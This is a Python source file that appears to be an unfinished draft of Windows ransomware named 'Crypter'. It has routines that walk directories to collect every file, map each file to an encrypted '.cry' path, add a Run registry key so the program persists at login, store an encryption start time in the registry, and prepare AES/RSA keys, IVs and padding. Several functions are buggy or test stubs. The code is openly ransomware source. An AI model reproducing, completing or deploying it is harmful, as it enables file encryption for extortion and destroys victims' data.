# -*- coding: utf-8 -*-
import sys,os,random
import winreg,time,json
import threading
import _thread

from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Random import random

def recher(retp):
    fileTab=[]
    for path,sous,files in os.walk(retp):
        for file in files:
            #print(file)
            mo=os.path.join(path,file)
            fileTab.append(mo)
        for file in sous:
            #print(file)
            mo=os.path.join(path,file)
            fileTab.append(mo)
    return fileTab


def exten(nom):
    lm=nom.split(".")[1]
    print(lm)
    

def copie(src,dst):
    s=open(src, "rb")
    d=open(dst,"wb")
    mo=s.readlines()
    for i in mo:
         d.write(i)
    s.close()
    d.close()
    
    
def generee(chifr):
    mom="0123456789ABCDEF"
    mo=''.join(random.choice(mom) for i in range(chifr))
    return mo


def filrF(file,rxt):
    file_detail={
                 'nom_file':file.split("\\")[-1],
                 'ext':str(file.split("\\")[-1]).split(".")[1],
                 'file_sans ext':str(file.split("\\")[-1]).split(".")[0],
                 'path':file,
                 'path_ecryp': file+'.'+rxt
                 }
    return file_detail

    
tab=filrF("sdfsdfd\\sdfd\\rdfgrre\\sdfrfs\\rererre.rer","cry")
print(tab['path_ecryp'])

def ajoutReG():
    STARTUP_REGISTRY_LOCATION = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    try:
        reg=winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,STARTUP_REGISTRY_LOCATION)
        winreg.SetValueEx(reg,"crypter",0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(reg)
    except WindowsError:
        print("erreur")


def modu(mo):    
    import subprocess
    subprocess.check_call(["python", '-m', 'pip', 'install', mo])
    
def get_start_time():
        '''
        @summary: Get's Crypter's start time from the registry, or creates it if it
        doesn't exist
        @return: The time that the ransomware began it's encryption operation, in integer epoch form
        '''
        REGISTRY_LOCATION = r"SOFTWARE\\Crypter"
        # Try to open registry key
        try:
            reg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, REGISTRY_LOCATION)
            start_time = winreg.QueryValueEx(reg, "")[0]
            winreg.CloseKey(reg)
        # If failure, create the key
        except WindowsError:
            start_time = int(time.time())
            reg = winreg.CreateKey(winreg.HKEY_CURRENT_USER, REGISTRY_LOCATION)
            winreg.SetValue(reg, "", winreg.REG_SZ, str(start_time))
            winreg.CloseKey(reg)

        return start_time



def fon(nom):
    listt=[]
    comp=open(nom,'r')
    while True:
        txt=comp.read(10)
        if len(txt)==0:
            break
        listt.append(txt)
    return listt



import getpass as gp

po=gp.getuser()

tex=''.join(random.choice('abcdef0123456789') for i in range(10))
print(po)
print(tex.upper())

iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(32))
print(iv)
chunk='dfghkjltre'
if len(chunk)%16!=0 :
    chunk += '*' * (16 - len(chunk) % 16)
    print(chunk)


